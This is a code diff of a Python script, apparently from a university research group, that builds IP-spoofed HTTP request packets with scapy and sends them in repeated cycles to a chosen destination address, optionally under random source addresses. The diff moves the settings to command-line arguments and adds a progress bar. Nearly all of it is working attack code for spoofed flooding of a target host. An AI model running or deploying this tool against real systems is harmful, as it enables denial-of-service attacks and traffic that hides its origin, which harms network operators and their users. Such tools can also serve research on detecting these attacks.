@@ -1,12 +1,37 @@
-import logging
-import time
-from argparse import ArgumentParser
-from random import randint
-from sys import argv
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
 
-from scapy.sendrecv import send
+__author__ = 'Diego F, Denner R, Kayua O, Lucas A,'
+__email__ = '@unipampa.edu.br '
+__version__ = '{1}.{0}.{1}'
+__data__ = '17/3/22'
+__credits__ = ['All']
 
-from headers import Header
+try:
+
+    import logging
+    import time
+    from argparse import ArgumentParser
+    from random import randint
+    from tqdm import tqdm
+    from view import View
+    from sys import argv
+    from scapy.sendrecv import send
+    from headers import Header
+
+except ImportError as error:
+
+    print(error)
+    print()
+    print("1. Setup a virtual environment: ")
+    print("  python3 - m venv ~/Python3env/Attack_low")
+    print("  source ~/Python3env/Attack_low/bin/activate ")
+    print()
+    print("2. Install requirements:")
+    print("  pip3 install --upgrade pip")
+    print("  pip3 install -r requirements.txt ")
+    print()
+    exit(-1)
 
 DEFAULT_HTTP_VERSION = 2.0
 DEFAULT_NUMBER_PACKETS_PER_CYCLES = 1
@@ -23,7 +48,13 @@ DEFAULT_VERBOSITY = logging.INFO
 TIME_FORMAT = '%Y-%m-%d,%H:%M:%S'
 
 
-def get_random_address_list(number_address=DEFAULT_NUMBER_RANDOM_ADDRESS):
+def init_view():
+    print('')
+    view = View()
+    view.print_view()
+
+
+def get_random_address_list(number_address):
     list_address = [[randint(0, 255), randint(0, 255), randint(0, 255), randint(0, 255)] for i in range(number_address)]
     list_address = ['.'.join(list(map(str, i))) for i in list_address]
     return list_address
@@ -35,36 +66,35 @@ def create_spoofing_packet(requisition, version=DEFAULT_HTTP_VERSION):
     return spoofing_packet
 
 
-def attack_function():
-    headers = Header(time_life_packet=DEFAULT_TIME_LIFE_PACKET, source_address=DEFAULT_SOURCE_ADDRESS,
-                     destination_address=DEFAULT_DESTINATION_ADDRESS, source_port=DEFAULT_SOURCE_PORT,
-                     destination_port=DEFAULT_DESTINATION_PORT, internal=1)
+def attack_function(args):
+    headers = Header(args.time_life_packet, args.source_ip, args.destination_ip, args.source_port,
+                     args.destination_port, 1)
 
     list_address = []
 
-    if DEFAULT_RANDOM_ADDRESS_SOURCE:
-        list_address = get_random_address_list(DEFAULT_NUMBER_RANDOM_ADDRESS)
+    if args.random_ip:
+        list_address = get_random_address_list(args.number_address)
 
-    logging.info('Start attack to Address {}'.format(DEFAULT_DESTINATION_ADDRESS))
+    logging.info('\nStart attack to Address {}\n'.format(args.destination_ip))
 
-    for i in range(DEFAULT_NUMBER_CYCLES):
+    for i in tqdm(range(args.number_cycles), desc='Attack progress'):
 
-        new_requisition = create_spoofing_packet('index.html', version=DEFAULT_HTTP_VERSION)
+        new_requisition = create_spoofing_packet('index.html', version=args.http_version)
 
-        if DEFAULT_RANDOM_ADDRESS_SOURCE:
-            headers.set_source_address(list_address[randint(0, DEFAULT_NUMBER_RANDOM_ADDRESS)])
+        if args.random_ip:
+            headers.set_source_address(list_address[randint(0, args.number_address)])
 
         packet_spoofing = headers.create_header_network_layer()
         packet_spoofing = headers.create_header_transport_layer(packet_spoofing)
         packet_spoofing = headers.create_header_application_layer(packet_spoofing, new_requisition)
-        packet_spoofing = packet_spoofing * DEFAULT_NUMBER_PACKETS_PER_CYCLES
-        send(packet_spoofing)
-        time.sleep(DEFAULT_TIME_BETWEEN_CYCLES)
-        logging.info("Cycle attack {} - Address {}".format(i, DEFAULT_DESTINATION_ADDRESS))
+        packet_spoofing = packet_spoofing * args.packets_per_cycle
+        send(packet_spoofing, verbose=0)
+        time.sleep(args.sleep)
+
+    logging.info("Attack End Address {}".format(args.destination_ip))
 
 
 def show_config(args):
-    logging.info('Command:\n\t{0}\n'.format(' '.join([x for x in argv])))
     logging.info('Settings:')
     lengths = [len(x) for x in vars(args).keys()]
     max_lengths = max(lengths)
@@ -106,11 +136,13 @@ def add_arguments(parser):
     help_msg = 'Define source port (Default {})'.format(DEFAULT_SOURCE_PORT)
     parser.add_argument("--source_port", type=int, help=help_msg, default=DEFAULT_SOURCE_PORT)
 
-    help_msg = 'Define source port (Default {})'.format(DEFAULT_SOURCE_PORT)
-    parser.add_argument("--source_port", type=int, help=help_msg, default=DEFAULT_SOURCE_PORT)
+    help_msg = 'Define source port (Default {})'.format(DEFAULT_DESTINATION_PORT)
+    parser.add_argument("--destination_port", type=int, help=help_msg, default=DEFAULT_DESTINATION_PORT)
 
     help_msg = 'Define size list random address (Default {})'.format(DEFAULT_NUMBER_RANDOM_ADDRESS)
     parser.add_argument("--number_address", type=int, help=help_msg, default=DEFAULT_NUMBER_RANDOM_ADDRESS)
+    help_msg = 'Define verbosity level (Default {})'.format(DEFAULT_VERBOSITY)
+    parser.add_argument("--verbosity", "-v", help="error", default=DEFAULT_VERBOSITY, type=int)
 
     return parser
 
@@ -123,13 +155,14 @@ def main():
     if arguments.verbosity == logging.DEBUG:
         logging.basicConfig(format="%(asctime)s %(levelname)s {%(module)s} [%(funcName)s] %(message)s",
                             datefmt=TIME_FORMAT, level=arguments.verbosity)
-        show_config(arguments)
 
     else:
 
         logging.basicConfig(format="%(message)s", datefmt=TIME_FORMAT, level=arguments.verbosity)
+    init_view()
+    show_config(arguments)
+    attack_function(arguments)
 
-    attack_function()
 
-
-attack_function()
+if __name__ == '__main__':
+    exit(main())
